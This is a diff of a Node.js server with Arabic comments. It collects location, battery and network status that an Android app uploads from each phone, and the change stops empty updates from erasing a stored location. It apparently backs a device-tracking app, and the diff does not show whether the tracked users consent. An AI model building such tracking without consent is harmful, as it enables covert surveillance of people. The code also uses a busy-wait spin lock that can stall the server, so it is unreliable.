@@ -264,9 +264,6 @@ app.post('/auth/revoke-device', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// استقبال البيانات من APK
-// ═══════════════════════════════════════════════════════
 app.post('/upload.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
@@ -506,6 +503,7 @@ app.post('/upload.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ✅ محدّث — لا يمسح الموقع إذا كان فاضي
 app.post('/live_update.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
@@ -516,10 +514,19 @@ app.post('/live_update.php', (req, res) => {
         const liveFile = path.join(deviceDir, 'live.json');
         let live = {};
         if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
-        live.network = data.network || 'متصل';
-        live.battery = data.battery || null;
-        live.location = data.location || null;
-        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
+
+        // ✅ حدّث فقط إذا القيمة صالحة
+        if (data.network) live.network = data.network;
+        if (data.battery !== undefined && data.battery !== null) live.battery = data.battery;
+
+        // ✅ لا تمسح الموقع إذا كان فاضي
+        if (data.location && data.location.latitude && data.location.longitude) {
+            live.location = data.location;
+        }
+
+        if (data.last_seen) live.last_seen = data.last_seen;
+        else live.last_seen = Math.floor(Date.now() / 1000);
+
         fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
         updateDevicesList(deviceId, null);
         res.json({ success: true });
@@ -887,7 +894,6 @@ app.get('/devices.json', (req, res) => {
     } catch (e) { res.json([]); }
 });
 
-// ✅ محدّث: يحدّث live.json تلقائياً
 function updateDevicesList(deviceId, deviceInfo) {
     while (devicesLock) { /* spin */ }
     devicesLock = true;
@@ -910,7 +916,7 @@ function updateDevicesList(deviceId, deviceInfo) {
         }
         fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 
-        // ✅ NEW: حدّث live.json تلقائياً
+        // ✅ حدّث live.json تلقائياً
         try {
             const liveFile = path.join(dataDir, deviceId, 'live.json');
             let live = {};
